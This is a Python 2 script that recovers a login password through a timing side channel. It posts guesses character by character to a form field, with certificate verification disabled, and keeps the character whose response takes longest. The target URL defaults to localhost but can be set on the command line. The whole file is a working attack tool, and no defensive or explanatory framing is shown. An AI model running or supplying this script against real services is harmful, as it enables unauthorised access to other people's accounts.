#!/usr/bin/env python2

import sys
import requests
import operator
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

charset = "abcdefghijklmnopqrstuvwxyzA -"
INVALID_CHAR = '`'


def get_sorted_guesses(known):
    guesses = {}
    for this_char in charset:
        guess = known + this_char + charset[0]
        
        payload = {field: guess}
        r = requests.post(url, data=payload, verify=False)
        
        print r.elapsed, guess
        
        guesses[guess] = r.elapsed
        
    return sorted(guesses.items(), key=operator.itemgetter(1), reverse=True)


def crack_password(url, field):
    known = ""
    last_best_guess_char = None
    
    #
    # first round
    #
    
    while True:
        sorted_guesses = get_sorted_guesses(known)
        
        best_guess = sorted_guesses[0]
        best_guess_char = best_guess[0][-2]
        best_guess_time = best_guess[1]
        
        rest_guesses = sorted_guesses[1:]
        rest_guesses_times = [rest_guess[1] for rest_guess in rest_guesses]

        average_rest_guesses_times = reduce(operator.add, rest_guesses_times)/len(rest_guesses_times)
        
        slope = best_guess_time - average_rest_guesses_times
        print "slope =", slope
        
        if best_guess_char != last_best_guess_char:
            last_best_guess_char = best_guess_char
        else:
            known += best_guess_char
            last_best_guess_char = None
            break
    
    #
    # subsequent rounds
    #
    
    while True:
        sorted_guesses = get_sorted_guesses(known)
        
        best_guess = sorted_guesses[0]
        best_guess_char = best_guess[0][-2]
        best_guess_time = best_guess[1]
    
        next_best_guess = sorted_guesses[1]
        _, next_best_guess_time = next_best_guess
        
        if (best_guess_time - next_best_guess_time).total_seconds() < 0.5 * slope.total_seconds():
            best_guess_char = INVALID_CHAR

        if best_guess_char != last_best_guess_char:
            last_best_guess_char = best_guess_char
        else:
            if best_guess_char != INVALID_CHAR:
                known += best_guess_char
                last_best_guess_char = None
            else:
                break
            
    print "Password =", known


if __name__ == '__main__':
    url = 'https://localhost:5003/'
    field = 'password'
    
    if len(sys.argv) >= 2:
        url = sys.argv[1]
    if len(sys.argv) >= 3:
        field = sys.argv[2]

    crack_password(url, field)
